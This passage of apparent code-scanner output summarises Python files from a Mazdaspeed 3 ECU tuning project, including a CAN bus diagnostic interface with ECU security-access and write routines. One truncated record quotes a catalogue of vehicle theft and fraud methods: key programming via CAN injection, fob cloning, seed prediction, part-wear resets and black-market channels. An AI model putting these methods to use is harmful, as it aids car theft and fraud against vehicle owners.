{"type": "hardware", "line": 495, "hardware": "vehicle", "content": "- Autonomous vehicle control system attacks"}, {"type": "hardware", "line": 498, "hardware": "ECU", "content": "- Stronger cryptographic implementations in ECUs"}, {"type": "hardware", "line": 499, "hardware": "ECU", "content": "- Secure boot and runtime integrity verification"}, {"type": "hardware", "line": 500, "hardware": "vehicle", "content": "- Intrusion detection systems for vehicle networks"}, {"type": "hardware", "line": 501, "hardware": "ECU", "content": "- Regular security updates for vehicle software"}, {"type": "hardware", "line": 501, "hardware": "vehicle", "content": "- Regular security updates for vehicle software"}, {"type": "hardware", "line": 502, "hardware": "ECU", "content": "- Physical security for diagnostic interfaces"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 83, "pattern": "key", "content": "'key_programming': 'CAN bus injection to program new keys',"}, {"type": "security_pattern", "line": 91, "pattern": "algorithm", "content": "'component_aging_reset': 'Reset part wear algorithms',"}, {"type": "security_pattern", "line": 176, "pattern": "key", "content": "'key_signal_relay_prevention': 'RFID blocking pouches',"}, {"type": "security_pattern", "line": 193, "pattern": "key", "content": "'key_programming': {"}, {"type": "security_pattern", "line": 195, "pattern": "key", "content": "'key_cloning_devices': 'Copy transponder and remote signals',"}, {"type": "security_pattern", "line": 196, "pattern": "key", "content": "'can_bus_injectors': 'Direct ECU communication for key learning',"}, {"type": "security_pattern", "line": 238, "pattern": "key", "content": "'key_fob_cloners': 'Duplicate remote entry systems',"}, {"type": "security_pattern", "line": 274, "pattern": "key", "content": "'encryption_key_extraction': 'Hardcoded key discovery',"}, {"type": "security_pattern", "line": 274, "pattern": "encrypt", "content": "'encryption_key_extraction': 'Hardcoded key discovery',"}, {"type": "security_pattern", "line": 280, "pattern": "seed", "content": "'security_seed_prediction': 'Weak random number generation'"}, {"type": "security_pattern", "line": 371, "pattern": "key", "content": "'key_programming_device': '$1,200-$2,500',"}, {"type": "security_pattern", "line": 393, "pattern": "encrypt", "content": "'dark_web_marketplaces': 'Encrypted transactions',"}, {"type": "security_pattern", "line": 395, "pattern": "encrypt", "content": "'encrypted_messaging': 'Telegram, Signal, Wickr',"}, {"type": "security_pattern", "line": 487, "pattern": "algorithm", "content": "2. Weak security algorithms in immobilizer systems"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add20.py", "lines_read": 216, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 96, "hardware": "vehicle", "content": "'vehicle_speed'"}, {"type": "hardware", "line": 115, "hardware": "vehicle", "content": "'vehicle_speed': (0, 200)"}], "security_logic": [{"type": "security_pattern", "line": 170, "pattern": "encrypt", "content": "'encryption': True"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add21.py", "lines_read": 523, "features_found": [{"type": "function", "name": "__init__", "line": 32}, {"type": "function", "name": "_initialize_ecu_addresses", "line": 54}, {"type": "function", "name": "connect", "line": 71}, {"type": "function", "name": "disconnect", "line": 86}, {"type": "function", "name": "start_receiving", "line": 93}, {"type": "function", "name": "_receive_loop", "line": 108}, {"type": "function", "name": "_process_loop", "line": 136}, {"type": "function", "name": "_process_can_message", "line": 154}, {"type": "function", "name": "_process_engine_ecu_message", "line": 176}, {"type": "function", "name": "_process_positive_response", "line": 193}, {"type": "function", "name": "_process_realtime_data", "line": 208}, {"type": "function", "name": "_process_mazda_specific_data", "line": 244}, {"type": "function", "name": "_process_negative_response", "line": 277}, {"type": "function", "name": "send_diagnostic_request", "line": 298}, {"type": "function", "name": "read_ecu_data", "line": 328}, {"type": "function", "name": "write_ecu_data", "line": 354}, {"type": "function", "name": "security_access", "line": 377}, {"type": "function", "name": "read_dtcs", "line": 408}, {"type": "function", "name": "clear_dtcs", "line": 431}, {"type": "function", "name": "get_live_data", "line": 445}, {"type": "function", "name": "register_message_handler", "line": 449}, {"type": "function", "name": "send_custom_message", "line": 453}, {"type": "function", "name": "calculate_checksum_8bit", "line": 474}, {"type": "function", "name": "bytes_to_hex_string", "line": 482}, {"type": "function", "name": "parse_obd2_pid_response", "line": 487}, {"type": "function", "name": "build_mazda_specific_request", "line": 513}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "CANMessage", "line": 18}, {"type": "class", "name": "Mazdaspeed3CANInterface", "line": 26}, {"type": "class", "name": "CANUtilities", "line": 470}], "algorithms": [{"type": "algorithm_function", "line": 474, "content": "def calculate_checksum_8bit(data: bytes) -> int:"}], "protocols": [{"type": "protocol", "line": 3, "protocol": "CAN", "content": "COMPLETE CAN BUS INTERFACE FOR MAZDASPEED 3"}, {"type": "protocol", "line": 18, "protocol": "CAN", "content": "class CANMessage:"}, {"type": "protocol", "line": 19, "protocol": "CAN", "content": "\"\"\"CAN message structure for Mazdaspeed 3\"\"\""}, {"type": "protocol", "line": 26, "protocol": "CAN", "content": "class Mazdaspeed3CANInterface:"}, {"type": "protocol", "line": 28, "protocol": "CAN", "content": "COMPLETE CAN BUS INTERFACE FOR 2011 MAZDASPEED 3"}, {"type": "protocol", "line": 57, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu_tx': 0x7E0,      # ECU transmit"}, {"type": "protocol", "line": 58, "protocol": "0x[0-9A-Fa-f]+", "content": "'engine_ecu_rx': 0x7E8,      # ECU receive"}, {"type": "protocol", "line": 59, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_tx': 0x7E1,             # Transmission control"}, {"type": "protocol", "line": 60, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_rx': 0x7E9,"}, {"type": "protocol", "line": 61, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs_tx': 0x7E2,             # ABS module"}, {"type": "protocol", "line": 62, "protocol": "0x[0-9A-Fa-f]+", "content": "'abs_rx': 0x7EA,"}, {"type": "protocol", "line": 63, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag_tx': 0x7E3,          # Airbag module"}, {"type": "protocol", "line": 64, "protocol": "0x[0-9A-Fa-f]+", "content": "'airbag_rx': 0x7EB,"}, {"type": "protocol", "line": 65, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster_tx': 0x7E4,         # Instrument cluster"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "'cluster_rx': 0x7EC,"}, {"type": "protocol", "line": 67, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer_tx': 0x7E5,     # Immobilizer"}, {"type": "protocol", "line": 68, "protocol": "0x[0-9A-Fa-f]+", "content": "'immobilizer_rx': 0x7ED"}, {"type": "protocol", "line": 72, "protocol": "CAN", "content": "\"\"\"Connect to CAN bus\"\"\""}, {"type": "protocol", "line": 80, "protocol": "CAN", "content": "logger.info(f\"Connected to CAN bus on {self.channel}\")"}, {"type": "protocol", "line": 83, "protocol": "CAN", "content": "logger.error(f\"CAN bus connection failed: {e}\")"}, {"type": "protocol", "line": 87, "protocol": "CAN", "content": "\"\"\"Disconnect from CAN bus\"\"\""}, {"type": "protocol", "line": 91, "protocol": "CAN", "content": "logger.info(\"Disconnected from CAN bus\")"}, {"type": "protocol", "line": 94, "protocol": "CAN", "content": "\"\"\"Start receiving CAN messages in background thread\"\"\""}, {"type": "protocol", "line": 96, "protocol": "CAN", "content": "raise RuntimeError(\"CAN bus not connected\")"}, {"type": "protocol", "line": 106, "protocol": "CAN", "content": "logger.info(\"CAN message reception started\")"}, {"type": "protocol", "line": 109, "protocol": "CAN", "content": "\"\"\"Main CAN message reception loop\"\"\""}, {"type": "protocol", "line": 114, "protocol": "CAN", "content": "can_msg = CANMessage("}, {"type": "protocol", "line": 130, "protocol": "CAN", "content": "logger.error(f\"CAN reception error: {e}\")"}, {"type": "protocol", "line": 137, "protocol": "CAN", "content": "\"\"\"Process received CAN messages\"\"\""}, {"type": "protocol", "line": 154, "protocol": "CAN", "content": "def _process_can_message(self, message: CANMessage):"}, {"type": "protocol", "line": 155, "protocol": "CAN", "content": "\"\"\"Process individual CAN message and extract data\"\"\""}, {"type": "protocol", "line": 170, "protocol": "0x[0-9A-Fa-f]+", "content": "elif message.arbitration_id < 0x700:"}, {"type": "protocol", "line": 176, "protocol": "CAN", "content": "def _process_engine_ecu_message(self, message: CANMessage):"}, {"type": "protocol", "line": 184, "protocol": "0x[0-9A-Fa-f]+", "content": "if service_id == 0x7F:  # Negative response"}, {"type": "protocol", "line": 186, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_id >= 0x40:  # Positive response"}, {"type": "protocol", "line": 187, "protocol": "0x[0-9A-Fa-f]+", "content": "service_type = service_id - 0x40"}, {"type": "protocol", "line": 193, "protocol": "CAN", "content": "def _process_positive_response(self, service_type: int, message: CANMessage):"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "if service_type == 0x22:  # ReadDataByIdentifier"}, {"type": "protocol", "line": 198, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_type == 0x2E:  # WriteDataByIdentifier"}, {"type": "protocol", "line": 200, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_type == 0x31:  # RoutineControl"}, {"type": "protocol", "line": 202, "protocol": "0x[0-9A-Fa-f]+", "content": "elif service_type == 0x27:  # SecurityAccess"}, {"type": "protocol", "line": 208, "protocol": "CAN", "content": "def _process_realtime_data(self, message: CANMessage):"}, {"type": "protocol", "line": 214, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 4 and data[0] == 0x0C:"}, {"type": "protocol", "line": 219, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 3 and data[0] == 0x0D:"}, {"type": "protocol", "line": 224, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 3 and data[0] == 0x05:"}, {"type": "protocol", "line": 229, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 4 and data[0] == 0x10:"}, {"type": "protocol", "line": 234, "protocol": "0x[0-9A-Fa-f]+", "content": "elif len(data) >= 3 and data[0] == 0x11:"}, {"type": "protocol", "line": 244, "protocol": "CAN", "content": "def _process_mazda_specific_data(self, message: CANMessage):"}, {"type": "protocol", "line": 245, "protocol": "CAN", "content": "\"\"\"Process Mazda-specific CAN messages\"\"\""}, {"type": "protocol", "line": 250, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 8 and data[0] == 0x80:  # Example Mazda-specific ID"}, {"type": "protocol", "line": 256, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 6 and data[0] == 0x81:"}, {"type": "protocol", "line": 262, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 7 and data[0] == 0x82:"}, {"type": "protocol", "line": 268, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) >= 8 and data[0] == 0x83:"}, {"type": "protocol", "line": 277, "protocol": "CAN", "content": "def _process_negative_response(self, message: CANMessage):"}, {"type": "protocol", "line": 284, "protocol": "0x[0-9A-Fa-f]+", "content": "0x10: 'General reject',"}, {"type": "protocol", "line": 285, "protocol": "0x[0-9A-Fa-f]+", "content": "0x11: 'Service not supported',"}, {"type": "protocol", "line": 286, "protocol": "0x[0-9A-Fa-f]+", "content": "0x12: 'Sub-function not supported',"}, {"type": "protocol", "line": 287, "protocol": "0x[0-9A-Fa-f]+", "content": "0x13: 'Incorrect message length or invalid format',"}, {"type": "protocol", "line": 288, "protocol": "0x[0-9A-Fa-f]+", "content": "0x22: 'Conditions not correct',"}, {"type": "protocol", "line": 289, "protocol": "0x[0-9A-Fa-f]+", "content": "0x33: 'Security access denied',"}, {"type": "protocol", "line": 290, "protocol": "0x[0-9A-Fa-f]+", "content": "0x35: 'Invalid key',"}, {"type": "protocol", "line": 291, "protocol": "0x[0-9A-Fa-f]+", "content": "0x36: 'Exceeded number of attempts',"}, {"type": "protocol", "line": 292, "protocol": "0x[0-9A-Fa-f]+", "content": "0x37: 'Required time delay not expired'"}, {"type": "protocol", "line": 329, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Read data from ECU by identifier (Service 0x22)\"\"\""}, {"type": "protocol", "line": 333, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x22, data=data_id_bytes)"}, {"type": "protocol", "line": 343, "protocol": "0x[0-9A-Fa-f]+", "content": "0xF187: bytes.fromhex('123456789ABCDEF0'),  # ECU serial"}, {"type": "protocol", "line": 344, "protocol": "0x[0-9A-Fa-f]+", "content": "0xF188: bytes.fromhex('20100815'),         # Programming date"}, {"type": "protocol", "line": 345, "protocol": "0x[0-9A-Fa-f]+", "content": "0xF190: bytes.fromhex('4A4D31424C313433313431313233343536'),  # VIN"}, {"type": "protocol", "line": 355, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Write data to ECU (Service 0x2E) - requires security access\"\"\""}, {"type": "protocol", "line": 366, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x2E, data=request_data)"}, {"type": "protocol", "line": 378, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Perform security access procedure (Service 0x27)\"\"\""}, {"type": "protocol", "line": 382, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x27, 0x01)"}, {"type": "protocol", "line": 394, "protocol": "0x[0-9A-Fa-f]+", "content": "request_data = bytearray([0x02])"}, {"type": "protocol", "line": 397, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x27, data=request_data)"}, {"type": "protocol", "line": 409, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Read diagnostic trouble codes (Service 0x19)\"\"\""}, {"type": "protocol", "line": 412, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x19, 0x02)  # Read DTC by status"}, {"type": "protocol", "line": 432, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"Clear all diagnostic trouble codes (Service 0x14)\"\"\""}, {"type": "protocol", "line": 434, "protocol": "0x[0-9A-Fa-f]+", "content": "success = self.send_diagnostic_request(0x14, 0xFF)  # Clear all DTCs"}, {"type": "protocol", "line": 450, "protocol": "CAN", "content": "\"\"\"Register custom handler for specific CAN messages\"\"\""}, {"type": "protocol", "line": 454, "protocol": "CAN", "content": "\"\"\"Send custom CAN message\"\"\""}, {"type": "protocol", "line": 470, "protocol": "CAN", "content": "class CANUtilities:"}, {"type": "protocol", "line": 471, "protocol": "CAN", "content": "\"\"\"Utility functions for CAN message processing\"\"\""}, {"type": "protocol", "line": 475, "protocol": "CAN", "content": "\"\"\"Calculate 8-bit checksum for CAN data\"\"\""}, {"type": "protocol", "line": 478, "protocol": "0x[0-9A-Fa-f]+", "content": "checksum = (checksum + byte) & 0xFF"}, {"type": "protocol", "line": 488, "protocol": "OBD", "content": "\"\"\"Parse OBD2 PID response data\"\"\""}, {"type": "protocol", "line": 488, "protocol": "PID", "content": "\"\"\"Parse OBD2 PID response data\"\"\""}, {"type": "protocol", "line": 489, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(data) < 3 or data[0] != 0x41:"}, {"type": "protocol", "line": 497, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid == 0x0C:  # Engine RPM"}, {"type": "protocol", "line": 500, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0D:  # Vehicle Speed"}, {"type": "protocol", "line": 503, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x05:  # Engine Coolant Temperature"}, {"type": "protocol", "line": 506, "protocol": "0x[0-9A-Fa-f]+", "content": "elif pid == 0x0B:  # Intake Manifold Pressure"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "CAN bus", "content": "COMPLETE CAN BUS INTERFACE FOR MAZDASPEED 3"}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "Real-time communication with vehicle ECU and modules using python-can"}, {"type": "hardware", "line": 4, "hardware": "vehicle", "content": "Real-time communication with vehicle ECU and modules using python-can"}, {"type": "hardware", "line": 28, "hardware": "CAN bus", "content": "COMPLETE CAN BUS INTERFACE FOR 2011 MAZDASPEED 3"}, {"type": "hardware", "line": 29, "hardware": "ECU", "content": "Handles all ECU communication, diagnostics, and real-time data acquisition"}, {"type": "hardware", "line": 39, "hardware": "ECU", "content": "self.ecu_addresses = self._initialize_ecu_addresses()"}, {"type": "hardware", "line": 52, "hardware": "ECU", "content": "self.security_access_granted = False"}, {"type": "hardware", "line": 54, "hardware": "ECU", "content": "def _initialize_ecu_addresses(self) -> Dict[str, int]:"}, {"type": "hardware", "line": 55, "hardware": "ECU", "content": "\"\"\"Initialize Mazdaspeed 3 specific ECU addresses\"\"\""}, {"type": "hardware", "line": 57, "hardware": "ECU", "content": "'engine_ecu_tx': 0x7E0,      # ECU transmit"}, {"type": "hardware", "line": 58, "hardware": "ECU", "content": "'engine_ecu_rx': 0x7E8,      # ECU receive"}, {"type": "hardware", "line": 59, "hardware": "TCM", "content": "'tcm_tx': 0x7E1,             # Transmission control"}, {"type": "hardware", "line": 60, "hardware": "TCM", "content": "'tcm_rx': 0x7E9,"}, {"type": "hardware", "line": 61, "hardware": "ABS", "content": "'abs_tx': 0x7E2,             # ABS module"}, {"type": "hardware", "line": 62, "hardware": "ABS", "content": "'abs_rx': 0x7EA,"}, {"type": "hardware", "line": 67, "hardware": "immobilizer", "content": "'immobilizer_tx': 0x7E5,     # Immobilizer"}, {"type": "hardware", "line": 68, "hardware": "immobilizer", "content": "'immobilizer_rx': 0x7ED"}, {"type": "hardware", "line": 72, "hardware": "CAN bus", "content": "\"\"\"Connect to CAN bus\"\"\""}, {"type": "hardware", "line": 80, "hardware": "CAN bus", "content": "logger.info(f\"Connected to CAN bus on {self.channel}\")"}, {"type": "hardware", "line": 83, "hardware": "CAN bus", "content": "logger.error(f\"CAN bus connection failed: {e}\")"}, {"type": "hardware", "line": 87, "hardware": "CAN bus", "content": "\"\"\"Disconnect from CAN bus\"\"\""}, {"type": "hardware", "line": 91, "hardware": "CAN bus", "content": "logger.info(\"Disconnected from CAN bus\")"}, {"type": "hardware", "line": 96, "hardware": "CAN bus", "content": "raise RuntimeError(\"CAN bus not connected\")"}, {"type": "hardware", "line": 158, "hardware": "ECU", "content": "if message.arbitration_id == self.ecu_addresses['engine_ecu_rx']:"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "self._process_engine_ecu_message(message)"}, {"type": "hardware", "line": 162, "hardware": "ECU", "content": "elif message.arbitration_id == self.ecu_addresses['tcm_rx']:"}, {"type": "hardware", "line": 162, "hardware": "TCM", "content": "elif message.arbitration_id == self.ecu_addresses['tcm_rx']:"}, {"type": "hardware", "line": 163, "hardware": "TCM", "content": "self._process_tcm_message(message)"}, {"type": "hardware", "line": 166, "hardware": "ECU", "content": "elif message.arbitration_id == self.ecu_addresses['abs_rx']:"}, {"type": "hardware", "line": 166, "hardware": "ABS", "content": "elif message.arbitration_id == self.ecu_addresses['abs_rx']:"}, {"type": "hardware", "line": 167, "hardware": "ABS", "content": "self._process_abs_message(message)"}, {"type": "hardware", "line": 176, "hardware": "ECU", "content": "def _process_engine_ecu_message(self, message: CANMessage):"}, {"type": "hardware", "line": 177, "hardware": "ECU", "content": "\"\"\"Process engine ECU diagnostic responses\"\"\""}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "elif service_type == 0x27:  # SecurityAccess"}, {"type": "hardware", "line": 203, "hardware": "ECU", "content": "self._process_security_access_response(message)"}, {"type": "hardware", "line": 221, "hardware": "vehicle", "content": "self.live_data['vehicle_speed'] = speed"}, {"type": "hardware", "line": 289, "hardware": "ECU", "content": "0x33: 'Security access denied',"}, {"type": "hardware", "line": 300, "hardware": "ECU", "content": "\"\"\"Send diagnostic request to ECU\"\"\""}, {"type": "hardware", "line": 314, "hardware": "ECU", "content": "arbitration_id=self.ecu_addresses['engine_ecu_tx'],"}, {"type": "hardware", "line": 328, "hardware": "ECU", "content": "def read_ecu_data(self, data_identifier: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 329, "hardware": "ECU", "content": "\"\"\"Read data from ECU by identifier (Service 0x22)\"\"\""}, {"type": "hardware", "line": 343, "hardware": "ECU", "content": "0xF187: bytes.fromhex('123456789ABCDEF0'),  # ECU serial"}, {"type": "hardware", "line": 351, "hardware": "ECU", "content": "logger.error(f\"ECU data read failed: {e}\")"}, {"type": "hardware", "line": 354, "hardware": "ECU", "content": "def write_ecu_data(self, data_identifier: int, data: bytes) -> bool:"}, {"type": "hardware", "line": 355, "hardware": "ECU", "content": "\"\"\"Write data to ECU (Service 0x2E) - requires security access\"\"\""}, {"type": "hardware", "line": 357, "hardware": "ECU", "content": "if not self.security_access_granted:"}, {"type": "hardware", "line": 358, "hardware": "ECU", "content": "logger.warning(\"Security access required for ECU write\")"}, {"type": "hardware", "line": 369, "hardware": "ECU", "content": "logger.info(f\"ECU data written: 0x{data_identifier:04X}\")"}, {"type": "hardware", "line": 374, "hardware": "ECU", "content": "logger.error(f\"ECU data write failed: {e}\")"}, {"type": "hardware", "line": 377, "hardware": "ECU", "content": "def security_access(self, seed: bytes = None) -> Optional[bytes]:"}, {"type": "hardware", "line": 378, "hardware": "ECU", "content": "\"\"\"Perform security access procedure (Service 0x27)\"\"\""}, {"type": "hardware", "line": 399, "hardware": "ECU", "content": "self.security_access_granted = True"}, {"type": "hardware", "line": 400, "hardware": "ECU", "content": "logger.info(\"Security access granted\")"}, {"type": "hardware", "line": 405, "hardware": "ECU", "content": "logger.error(f\"Security access failed: {e}\")"}, {"type": "hardware", "line": 500, "hardware": "vehicle", "content": "elif pid == 0x0D:  # Vehicle Speed"}], "security_logic": [{"type": "security_pattern", "line": 52, "pattern": "security_access", "content": "self.security_access_granted = False"}, {"type": "security_pattern", "line": 203, "pattern": "security_access", "content": "self._process_security_access_response(message)"}, {"type": "security_pattern", "line": 290, "pattern": "key", "content": "0x35: 'Invalid key',"}, {"type": "security_pattern", "line": 357, "pattern": "security_access", "content": "if not self.security_access_granted:"}, {"type": "security_pattern", "line": 377, "pattern": "seed", "content": "def security_access(self, seed: bytes = None) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 377, "pattern": "security_access", "content": "def security_access(self, seed: bytes = None) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 380, "pattern": "seed", "content": "if seed is None:"}, {"type": "security_pattern", "line": 389, "pattern": "seed", "content": "mock_seed = bytes.fromhex('A1B2C3D4')"}, {"type": "security_pattern", "line": 390, "pattern": "seed", "content": "return mock_seed"}, {"type": "security_pattern", "line": 395, "pattern": "seed", "content": "request_data.extend(seed)"}, {"type": "security_pattern", "line": 399, "pattern": "security_access", "content": "self.security_access_granted = True"}, {"type": "security_pattern", "line": 402, "pattern": "seed", "content": "return seed if success else None"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add22.py", "lines_read": 662, "features_found": [{"type": "function", "name": "__init__", "line": 49}, {"type": "function", "name": "_initialize_database", "line": 78}, {"type": "function", "name": "start_logging", "line": 150}, {"type": "function", "name": "stop_logging", "line": 173}, {"type": "function", "name": "_logging_loop", "line": 192}, {"type": "function", "name": "_collect_current_data", "line": 225}, {"type": "function", "name": "_processing_loop", "line": 256}, {"type": "function", "name": "_store_entries", "line": 276}, {"type": "function", "name": "_update_session_stats", "line": 307}, {"type": "function", "name": "_detect_performance_events", "line": 315}, {"type": "function", "name": "_record_event", "line": 350}, {"type": "function", "name": "_save_session_summary", "line": 372}, {"type": "function", "name": "get_recent_data", "line": 402}, {"type": "function", "name": "get_session_statistics", "line": 421}, {"type": "function", "name": "analyze_performance_trends", "line": 458}, {"type": "function", "name": "_calculate_trend", "line": 495}, {"type": "function", "name": "export_data", "line": 519}, {"type": "function", "name": "cleanup_old_data", "line": 548}, {"type": "function", "name": "__init__", "line": 581}, {"type": "function", "name": "detect_knock_patterns", "line": 584}, {"type": "function", "name": "analyze_boost_consistency", "line": 614}, {"type": "function", "name": "calculate_power_band", "line": 639}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "sqlite3", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "datetime,", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "pandas", "line": null}, {"type": "import", "module": "dataclass,", "line": null}, {"type": "import", "module": "logging", "line": null}], "components_found": [{"type": "class", "name": "LogEntry", "line": 21}, {"type": "class", "name": "DataLogger", "line": 43}, {"type": "class", "name": "DataAnalyzer", "line": 578}], "algorithms": [{"type": "algorithm_function", "line": 495, "content": "def _calculate_trend(self, df: pd.DataFrame, column: str) -> float:"}, {"type": "algorithm_function", "line": 639, "content": "def calculate_power_band(self, window_hours: float = 1.0) -> Dict:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 25, "hardware": "vehicle", "content": "vehicle_speed: float"}, {"type": "hardware", "line": 85, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 90, "hardware": "vehicle", "content": "vehicle_speed REAL,"}, {"type": "hardware", "line": 111, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 126, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 139, "hardware": "ECU", "content": "cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON tuning_logs(timestamp)')"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "cursor.execute('CREATE INDEX IF NOT EXISTS idx_rpm ON tuning_logs(engine_rpm)')"}, {"type": "hardware", "line": 141, "hardware": "ECU", "content": "cursor.execute('CREATE INDEX IF NOT EXISTS idx_boost ON tuning_logs(boost_psi)')"}, {"type": "hardware", "line": 226, "hardware": "vehicle", "content": "\"\"\"Collect current vehicle data for logging\"\"\""}, {"type": "hardware", "line": 233, "hardware": "vehicle", "content": "vehicle_speed=45.2,"}, {"type": "hardware", "line": 282, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 284, "hardware": "vehicle", "content": "timestamp, engine_rpm, vehicle_speed, throttle_position,"}, {"type": "hardware", "line": 291, "hardware": "vehicle", "content": "entry.timestamp, entry.engine_rpm, entry.vehicle_speed,"}, {"type": "hardware", "line": 311, "hardware": "vehicle", "content": "self.session_stats['max_speed'] = max(self.session_stats['max_speed'], entry.vehicle_speed)"}, {"type": "hardware", "line": 334, "hardware": "vehicle", "content": "if entry.vehicle_speed > 150.0:"}, {"type": "hardware", "line": 359, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 368, "hardware": "vehicle", "content": "entry.vehicle_speed,"}, {"type": "hardware", "line": 381, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 427, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 432, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 556, "hardware": "ECU", "content": "cursor.execute('DELETE FROM tuning_logs WHERE timestamp < ?', (cutoff_timestamp,))"}, {"type": "hardware", "line": 559, "hardware": "ECU", "content": "cursor.execute('''"}, {"type": "hardware", "line": 565, "hardware": "ECU", "content": "cursor.execute('''"}], "security_logic": [{"type": "security_pattern", "line": 87, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 113, "pattern": "key", "content": "session_id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 128, "pattern": "key", "content": "event_id INTEGER PRIMARY KEY AUTOINCREMENT,"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["ads"]}
{"file_path": "add23.py", "lines_read": 542, "features_found": [{"type": "import", "module": "sqlalchemy.ext.declarative", "line": null}, {"type": "import", "module": "sqlalchemy.orm", "line": null}, {"type": "import", "module": "sqlalchemy", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "sqlalchemy", "line": null}, {"type": "import", "module": "declarative_base", "line": null}, {"type": "import", "module": "sessionmaker,", "line": null}, {"type": "import", "module": "Column,", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 24, "hardware": "vehicle", "content": "vehicle_model = Column(String(20), nullable=False)  # 'MAZDASPEED3_2011'"}, {"type": "hardware", "line": 25, "hardware": "ECU", "content": "ecu_hardware = Column(String(30))  # 'MZR_DISI_L3K9'"}, {"type": "hardware", "line": 97, "hardware": "vehicle", "content": "vehicle_model = Column(String(20), nullable=False)"}, {"type": "hardware", "line": 203, "hardware": "vehicle", "content": "vehicle_specific_notes = Column(Text) # Mazdaspeed 3 specific notes"}, {"type": "hardware", "line": 390, "hardware": "vehicle", "content": "vehicle_model=\"MAZDASPEED3_2011\","}, {"type": "hardware", "line": 391, "hardware": "ECU", "content": "ecu_hardware=\"MZR_DISI_L3K9\","}, {"type": "hardware", "line": 421, "hardware": "vehicle", "content": "description=\"Safe performance tune for stock vehicle with 91 octane fuel\","}, {"type": "hardware", "line": 422, "hardware": "vehicle", "content": "vehicle_model=\"MAZDASPEED3_2011\","}, {"type": "hardware", "line": 